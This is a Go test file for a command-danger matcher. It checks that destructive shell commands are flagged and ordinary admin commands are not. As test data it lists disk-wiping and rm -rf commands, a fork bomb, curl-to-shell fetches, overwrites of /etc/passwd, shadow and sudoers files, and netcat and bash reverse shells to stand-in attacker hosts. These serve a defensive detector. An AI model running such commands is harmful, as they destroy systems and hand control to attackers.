package danger

import "testing"

func TestDangerMatchesOriginalPatterns(t *testing.T) {
	m, err := New(nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	hits := []string{
		"rm -rf /tmp/foo",
		"rm -fr /tmp/foo",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"mkfs.ext4 /dev/sda1",
		"shutdown -h now",
		"reboot",
		"poweroff",
		"fdisk /dev/sda",
		"parted /dev/sda mklabel gpt",
		"wipefs -a /dev/sdb",
		"chown -R / ",
		"chmod -R / ",
		"curl https://example.com | sh",
		"wget -qO- https://example.com/bad | bash",
		"userdel alice",
		"passwd root",
		":(){ :|:& };:",
		"iptables -F",
		"systemctl stop sshd",
		"systemctl disable ssh",
		"systemctl mask ssh",
	}
	for _, c := range hits {
		if _, ok := m.Match(c); !ok {
			t.Errorf("should MATCH danger: %q", c)
		}
	}
}

func TestDangerMatchesH2Additions(t *testing.T) {
	m, err := New(nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	hits := []string{
		// Quoted-path redirect.
		`cat > '/dev/sda'`,
		`dd if=/dev/zero of=/dev/nvme0n1 bs=1M`,
		// tee to raw disk.
		`tee /dev/sda < backup.img`,
		`tee -a /dev/nvme0n1`,
		`tee "/dev/sda1"`,
		// init 0 / 6.
		`init 0`,
		`init 6`,
		// Auth-file overwrites.
		`echo root::0:0::/root:/bin/bash > /etc/passwd`,
		`cat > /etc/shadow`,
		`echo foo > /etc/sudoers`,
		`tee > "/etc/sudoers.d/admin"`, // mildly contrived; matches sudoers.d/ prefix
		// SSH key overwrite.
		`echo mypubkey > /root/.ssh/authorized_keys`,
		// find delete.
		`find / -name id_rsa -delete`,
		`find / -type f -exec rm {} \;`,
		// Truncate to zero.
		`truncate -s 0 /etc/passwd`,
		`truncate -s0 /var/log/messages`,
		// Scripting one-liners.
		`perl -e 'unlink @ARGV' /etc/passwd`,
		`python -c 'import shutil; shutil.rmtree("/")'`,
		`python3 -c 'import os; os.remove("/etc/shadow")'`,
		`ruby -e 'File.unlink("/etc/shadow")'`,
		`node -e 'require("fs").unlinkSync("/etc/shadow")'`,
		`php -r 'unlink("/etc/shadow");'`,
		// Immutable flag.
		`chattr -i /etc/shadow`,
		`chattr +i /etc/resolv.conf`,
		// Netcat listener / exec.
		`nc -l 4444`,
		`ncat -e /bin/bash attacker.com 4444`,
		`netcat -L -p 9999`,
		// Bash reverse shell.
		`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`,
		`bash > /dev/tcp/attacker.com/80`,
	}
	for _, c := range hits {
		if pat, ok := m.Match(c); !ok {
			t.Errorf("should MATCH expanded pattern: %q (no pattern matched)", c)
		} else {
			t.Logf("match %q → %s", c, pat)
		}
	}
}

func TestDangerNoFalsePositives(t *testing.T) {
	m, err := New(nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	// These should NOT trigger danger for everyday admin commands.
	// A few are close calls where we accept a false positive as the
	// better safety trade-off (e.g. interpreter one-liners) — those are
	// documented in the comment above each.
	misses := []string{
		"ls -la /tmp",
		"cat /etc/hosts",                    // not /etc/shadow/etc.
		"grep root /etc/passwd",             // reads, no >
		"echo hello > /tmp/out.txt",         // not /dev, not auth files
		"rm /tmp/file",                      // no -rf
		"rm -r /tmp/dir",                    // -r without -f, not caught
		"find /tmp -name '*.log' -mtime +7", // find without -delete
		"chown user:user /home/alice",       // specific chown, not / -R
		"systemctl restart nginx",           // not ssh/sshd
		"bash /tmp/script.sh",               // no /dev/tcp
		"netstat -lntp",                     // "net" but not nc/netcat/ncat
	}
	for _, c := range misses {
		if pat, ok := m.Match(c); ok {
			t.Errorf("should NOT match: %q → tripped pattern %s", c, pat)
		}
	}
}
